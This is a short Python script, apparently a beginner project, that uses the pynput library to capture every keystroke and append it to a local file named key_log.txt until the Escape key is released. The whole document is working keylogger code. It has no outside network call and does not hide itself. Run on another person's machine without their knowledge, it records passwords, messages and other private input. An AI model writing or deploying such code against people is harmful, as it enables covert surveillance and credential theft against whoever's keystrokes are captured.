from pynput import keyboard

def KeyLogger(key):
    try:
        with open('key_log.txt', 'a') as file:
            file.write(f'{key.char}')
    except AttributeError:
        with open('key_log.txt','a') as file:
            file.write(f'[{key}]')


def On_release(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press= KeyLogger, on_release=On_release) as listener:
    listener.join()